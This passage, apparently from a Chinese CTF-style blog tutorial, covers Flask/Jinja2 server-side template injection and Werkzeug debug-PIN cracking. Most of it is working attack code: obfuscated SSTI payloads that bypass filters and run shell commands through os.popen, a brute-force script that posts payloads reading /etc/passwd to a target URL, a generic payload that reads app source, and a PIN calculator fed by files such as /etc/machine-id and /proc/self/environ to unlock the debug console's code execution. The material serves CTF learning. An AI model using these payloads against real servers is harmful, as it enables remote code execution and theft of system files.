%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xhx,<span class="built_in">dict</span>(getitem=<span class="number">1</span>)|join,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cat=(<span class="built_in">dict</span>(<span class="built_in">type</span>=<span class="number">1</span>)|join,kg[<span class="number">10</span>],<span class="built_in">dict</span>(flag=<span class="number">1</span>)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=<span class="number">1</span>)|join %&#125;</span><br><span class="line">&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(<span class="number">108</span>)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure><p>修改后的模板如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> ershisi = <span class="built_in">dict</span>(aaaaaaaa=a)|join|length*<span class="built_in">dict</span>(aaa=a)|join|length %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> shi = <span class="built_in">dict</span>(aaaaaaaaaa=a)|join|length %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> yilingba = <span class="built_in">dict</span>(aaaaaa=a)|join|length*<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|length %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> kg=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhxa=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhxb=xhxa|attr(pop)(ershisi)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> xhx=(xhxb,xhxb)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cls=(xhx,(<span class="built_in">dict</span>(<span class="keyword">class</span>=a)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> base=(xhx,(<span class="built_in">dict</span>(base=a)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> subclasses=(xhx,(<span class="built_in">dict</span>(subclasses=a)|join),xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> lm=((<span class="built_in">dict</span>(load=a)|join),xhxb,(<span class="built_in">dict</span>(module=a)|join))|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> getitem=(xhx,<span class="built_in">dict</span>(getitem=a)|join,xhx)|join %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> cat=(<span class="built_in">dict</span>(<span class="built_in">type</span>=a)|join,kg|attr(pop)(shi),<span class="built_in">dict</span>(flag=a)|join)|join%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;</span><br><span class="line">&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(yilingba)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改后的payload如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=&#123;% <span class="built_in">set</span> ershisi = <span class="built_in">dict</span>(aaaaaaaa=a)|join|length*<span class="built_in">dict</span>(aaa=a)|join|length %&#125;&#123;% <span class="built_in">set</span> shi = <span class="built_in">dict</span>(aaaaaaaaaa=a)|join|length %&#125;&#123;% <span class="built_in">set</span> yilingba = <span class="built_in">dict</span>(aaaaaa=a)|join|length*<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|length %&#125;&#123;% <span class="built_in">set</span> pop=<span class="built_in">dict</span>(pop=a)|join %&#125;&#123;% <span class="built_in">set</span> kg=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;&#123;% <span class="built_in">set</span> xhxa=(&#123;&#125;|select()|string())|<span class="built_in">list</span> %&#125;&#123;% <span class="built_in">set</span> xhxb=xhxa|attr(pop)(ershisi)%&#125;&#123;% <span class="built_in">set</span> xhx=(xhxb,xhxb)|join %&#125;&#123;% <span class="built_in">set</span> cls=(xhx,(<span class="built_in">dict</span>(<span class="keyword">class</span>=a)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> base=(xhx,(<span class="built_in">dict</span>(base=a)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> subclasses=(xhx,(<span class="built_in">dict</span>(subclasses=a)|join),xhx)|join %&#125;&#123;% <span class="built_in">set</span> lm=((<span class="built_in">dict</span>(load=a)|join),xhxb,(<span class="built_in">dict</span>(module=a)|join))|join %&#125;&#123;% <span class="built_in">set</span> os=<span class="built_in">dict</span>(os=a)|join %&#125;&#123;% <span class="built_in">set</span> popen=<span class="built_in">dict</span>(popen=a)|join %&#125;&#123;% <span class="built_in">set</span> getitem=(xhx,<span class="built_in">dict</span>(getitem=a)|join,xhx)|join %&#125;&#123;% <span class="built_in">set</span> cat=(<span class="built_in">dict</span>(<span class="built_in">type</span>=a)|join,kg|attr(pop)(shi),<span class="built_in">dict</span>(flag=a)|join)|join%&#125;&#123;% <span class="built_in">set</span> read=<span class="built_in">dict</span>(read=a)|join %&#125;&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(yilingba)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure><p>要注意的是这里在计算长度的时候，不清楚为什么不让加减法，可能是字符串的原因，尽量就是整除把，然后下面的payload有替代的过滤器也可以试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> shi = <span class="built_in">dict</span>(aaaaaaaaaa=a)|join|length %&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> shi = <span class="built_in">dict</span>(aaaaaaaaaa=a)|join|count %&#125;</span><br></pre></td></tr></table></figure><h1 id="爆破相关脚本与通用载荷"><a href="#爆破相关脚本与通用载荷" class="headerlink" title="爆破相关脚本与通用载荷"></a>爆破相关脚本与通用载荷</h1><p>脚本相关的可以看下面的，可以自行魔改，这是通用的，感觉没通用<code>payload</code>好用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;xxxxx&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">    payload = (</span><br><span class="line">        <span class="string">&quot;&#123;&#123;&quot;</span></span><br><span class="line">        <span class="string">&quot;.__class__.__base__.__subclasses__()[&quot;</span></span><br><span class="line">        + <span class="built_in">str</span>(i)</span><br><span class="line">        + <span class="string">&#x27;][&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)&#125;&#125;&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    data = &#123;<span class="string">&quot;text&quot;</span>: base64.b64encode(payload.encode())&#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        <span class="built_in">print</span>(res.status_code)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;index&quot;</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">302</span>:</span><br><span class="line">            <span class="built_in">print</span>(res.text)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;index&quot;</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>下面看一下通用payload，这个用的模块在本文没讲过，是外部收集过来的，原理就是通过他自己去for遍历，而不是咱们外部爆破，我看这个听通用的，收集过来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><h1 id="关于FLASK的Pin码计算"><a href="#关于FLASK的Pin码计算" class="headerlink" title="关于FLASK的Pin码计算"></a>关于FLASK的Pin码计算</h1><p>在debug运行flask的过程中还发现了，基本flask每次重启pin码都不会更变<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702173957.png"><br>这一个地方也可以作为一个考点，给一个任意文件读取的漏洞，就可以计算出pin码，在执行到报错的代码之后会出现错误页，在右边会有一个控制栏图标<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702181729.png"><br>点击输入pin码即可执行任意代码<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702181815.png"><br>然后具体的计算原理和方式参考下面内容。</p><h2 id="关于源代码的解读"><a href="#关于源代码的解读" class="headerlink" title="关于源代码的解读"></a>关于源代码的解读</h2><p>关键生成Pin码的位置是<code>C:\Users\BoyChai\.conda\envs\flask\Lib\site-packages\werkzeug\debug\__init__.py</code>，具体就是<code>site-packages\werkzeug\debug\__init__.py</code>他的关键代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_pin_and_cookie_name</span>(<span class="params"></span></span><br><span class="line"><span class="params">    app: WSGIApplication,</span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="built_in">tuple</span>[<span class="built_in">str</span>, <span class="built_in">str</span>] | <span class="built_in">tuple</span>[<span class="literal">None</span>, <span class="literal">None</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin</span></span><br><span class="line"><span class="string">    code and a random key.  The hope is that this is stable between</span></span><br><span class="line"><span class="string">    restarts to not make debugging particularly frustrating.  If the pin</span></span><br><span class="line"><span class="string">    was forcefully disabled this returns `None`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Second item in the resulting tuple is the cookie name for remembering.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pin = os.environ.get(<span class="string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was explicitly disabled</span></span><br><span class="line">    <span class="keyword">if</span> pin == <span class="string">&quot;off&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Pin was provided explicitly</span></span><br><span class="line">    <span class="keyword">if</span> pin <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> pin.replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).isdecimal():</span><br><span class="line">        <span class="comment"># If there are separators in the pin, return it directly</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;-&quot;</span> <span class="keyword">in</span> pin:</span><br><span class="line">            rv = pin</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num = pin</span><br><span class="line"></span><br><span class="line">    modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">    username: <span class="built_in">str</span> | <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># getuser imports the pwd module, which does not exist in Google</span></span><br><span class="line">        <span class="comment"># App Engine. It may also raise a KeyError if the UID does not</span></span><br><span class="line">        <span class="comment"># have a username, such as in Docker.</span></span><br><span class="line">        username = getpass.getuser()</span><br><span class="line">    <span class="comment"># Python &gt;= 3.13 only raises OSError</span></span><br><span class="line">    <span class="keyword">except</span> (ImportError, KeyError, OSError):</span><br><span class="line">        username = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    mod = sys.modules.get(modname)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information only exists to make the cookie unique on the</span></span><br><span class="line">    <span class="comment"># computer, not as a security feature.</span></span><br><span class="line">    probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This information is here to make it harder for an attacker to</span></span><br><span class="line">    <span class="comment"># guess the cookie name.  They are unlikely to be contained anywhere</span></span><br><span class="line">    <span class="comment"># within the unauthenticated debug page.</span></span><br><span class="line">    private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br><span class="line"></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode()</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br></pre></td></tr></table></figure><p>阅读后会发现他生成pin码所需要的关键数据如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">modname = <span class="built_in">getattr</span>(app, <span class="string">&quot;__module__&quot;</span>, t.cast(<span class="built_in">object</span>, app).__class__.__module__)</span><br><span class="line">username = getpass.getuser()</span><br><span class="line">probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        <span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__),</span><br><span class="line">        <span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>),</span><br><span class="line">    ]</span><br><span class="line">private_bits = [<span class="built_in">str</span>(uuid.getnode()), get_machine_id()]</span><br></pre></td></tr></table></figure><p>通过debug发现数据内容<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250702174343.png"><br>结合debug和源码内容，他们这些数据分别如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">username       运行flask程序的用户名</span><br><span class="line">modname        似乎都是固定的Flask</span><br><span class="line"><span class="built_in">getattr</span>(app, <span class="string">&quot;__name__&quot;</span>, <span class="built_in">type</span>(app).__name__) 运行程序的库文件名字，似乎也是固定的flask.app   </span><br><span class="line"><span class="built_in">getattr</span>(mod, <span class="string">&quot;__file__&quot;</span>, <span class="literal">None</span>) flask/app.py的位置</span><br><span class="line"><span class="built_in">str</span>(uuid.getnode()) 电脑MAC地址</span><br><span class="line">get_machine_id()    需要读取源码，他会根据不同的操作系统读取不同的文件来获取这个<span class="built_in">id</span></span><br></pre></td></tr></table></figure><p>他们每个数据的手动获取方式如下</p><ul><li>username读取<code>/etc/passwd</code>，一般大于1000的就是，题目不会创建太多，或者<code>/proc/self/environ</code>环境变量中读取</li><li>网卡mac地址一般linux直接读取<code>/sys/class/net/eth0/address</code>或者<code>/sys/class/net/ens33/address</code>都会有</li><li>machine_id读取稍微麻烦，linux是<code>/proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id</code>文件，版本较新的可能是这几个<code>/etc/machine-id、/proc/sys/kernel/random/boot_id</code>，windows是在注册表中<code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography</code></li><li>modname 固定Flask</li><li>还有两个有一个是默认固定的<code>flask.app</code>，另外一个是flask的app.py位置，在报错页面可以看到<img src="https://image.boychai.xyz/article/Pasted%20image%2020250702180555.png"><br>生成时的逻辑是</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">h = hashlib.sha1()</span><br><span class="line">   <span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">       <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">           <span class="keyword">continue</span></span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">           bit = bit.encode()</span><br><span class="line">       h.update(bit)</span><br><span class="line">   h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">   cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">   <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">   <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">       h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">       num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br></pre></td></tr></table></figure><p>通过debug发现num就是pin码</p><h2 id="Pin码计算脚本"><a href="#Pin码计算脚本" class="headerlink" title="Pin码计算脚本"></a>Pin码计算脚本</h2><p>由上面分析可以推出下面计算脚本<br>部分参考于： <a href="https://blog.csdn.net/weixin_63231007/article/details/131659892">https://blog.csdn.net/weixin_63231007/article/details/131659892</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"> </span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span>  <span class="comment"># username 可通过/etc/passwd获取</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485723332611&#x27;</span>,  <span class="comment"># /sys/class/net/eth0/address mac地址十进制</span></span><br><span class="line">    <span class="string">&#x27;96cec10d3d9307792745ec3b85c89620b10a06f1c0105bb2402a7e5d2e965c143de814597bafa25eeea9e79b7f6a7fb2&#x27;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup</span></span><br><span class="line">    <span class="comment"># 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"> </span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"> </span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"> 